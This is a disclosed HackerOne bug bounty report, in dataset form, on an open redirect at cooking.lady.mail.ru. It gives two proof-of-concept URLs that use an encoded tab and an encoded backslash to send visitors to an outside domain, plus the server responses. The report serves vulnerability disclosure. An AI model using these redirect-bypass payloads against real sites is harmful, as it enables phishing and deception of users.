---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '192373'
original_report_id: '192373'
title: '[cooking.lady.mail.ru] Open Redirect'
weakness: Open Redirect
team_handle: mailru
created_at: '2016-12-19T09:55:41.466Z'
disclosed_at: '2017-03-02T13:17:23.383Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 7
tags:
- hackerone
- open-redirect
---

# [cooking.lady.mail.ru] Open Redirect

## Metadata

- HackerOne Report ID: 192373
- Weakness: Open Redirect
- Program: mailru
- Disclosed At: 2017-03-02T13:17:23.383Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

**PoC**
```
Chrome, IE:
https://cooking.lady.mail.ru/%09/blackfan.ru

Chrome, IE, FireFox:
https://cooking.lady.mail.ru/%5cblackfan.ru
```

**HTTP Response**
```http
HTTP/1.1 301 Moved Permanently
...
Location: /	/blackfan.ru/
```
```http
HTTP/1.1 301 Moved Permanently
...
Location: /\blackfan.ru/
```

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
